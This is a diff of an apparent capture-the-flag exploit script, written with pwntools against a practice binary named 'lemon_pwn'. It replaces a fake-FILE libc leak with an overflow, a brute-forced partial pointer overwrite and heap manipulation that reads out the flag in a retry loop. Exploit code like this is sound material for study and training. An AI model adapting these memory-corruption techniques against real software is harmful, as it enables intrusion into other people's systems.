@@ -1,5 +1,4 @@
 from pwn import *
-from rpyc import lib
 
 context(os = 'linux', arch = 'amd64', log_level = 'debug')
 io = process('lemon_pwn')
@@ -9,7 +8,7 @@ libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/li
 elf = ELF('lemon_pwn')
 
 
-def add(index, name, size, message):
+def add(index, name, size, message = ''):
     io.sendlineafter('your choice >>> ', '1')
     io.sendlineafter('Input the index of your lemon: ', str(index))
     io.sendafter('Now, name your lemon: ', name)
@@ -36,33 +35,35 @@ def edit(index, payload):
     io.sendafter('Now it\'s your time to draw and color!', payload)
 
 
-def game():
-    io.sendlineafter('Do you wanner play a guess-lemon-color game with me?\n', 'yes')
-    io.sendafter('Give me your lucky number: \n', '12345678')
-    io.sendlineafter('tell me you name first: \n', 'aaaa')
+def pwn():
+    io.sendlineafter("Do you wanner play a guess-lemon-color game with me?\n", "yes")
+    io.sendafter("Give me your lucky number: \n", "111111")
 
+    payload = b'1' * 0x10 + p32(0x300) + b'\x01'
+    io.sendafter("tell me you name first: \n", payload)
+    io.recvuntil(', your reward is ')
+    low = int(io.recvline()[:-1], 16)
 
-def leak():
-    global libc_base
-    payload = p64(0xfbad1800) + p64(1) * 3 + b'\x18'
-    edit(-268, payload)
-    libc_base = u64(io.recvuntil(b'\x7f\x00\x00')[-8:]) - libc.sym['_IO_file_jumps']
-    log.success('libc_base: ' + hex(libc_base))
-    '''add(0, 'aaaa', 0x88, 'aaaa')
-    add(1, 'fake', 0x1000, 'aaaa')
+    edit(-260, b'1' * 0x138 + p16(low + 0xe000 - 0x40))   # 1/16
+    add(0, 'A', 0x500)
     delete(0)
-    fake_chunk = libc_base + libc.sym['_IO_2_1_stderr_'] + 0xad
-    payload = b'a' * 16 + p32(0x20) + p32(1) + p64(fake_chunk)
-    add(0, 'aaaa', 0x20, payload)'''
-    add(0, 'fake', 0x1000, 'aaaa')
-    add(1, 'aaaa', 0x88, 'aaaa')
-    gdb.attach(io)
-    delete(1)
-    
-    pause()
+    add(1, '\x10', 0x10, 'a')
+    add(0, '\x10', 0x10, 'a')
+    io.sendlineafter('your choice >>> ', '1')
+    io.sendlineafter('Input the index of your lemon: ', '0')
+    result = io.recvuntil('}').decode()
+    log.success(result)
+    # gdb.attach(io)
+    # pause()
+
 
 
 if __name__ == '__main__':
-    game()
-    leak()
-
+    while True:
+        try:
+            pwn()
+        except EOFError:
+            io.close()
+            io = process('lemon_pwn')
+        else:
+            break
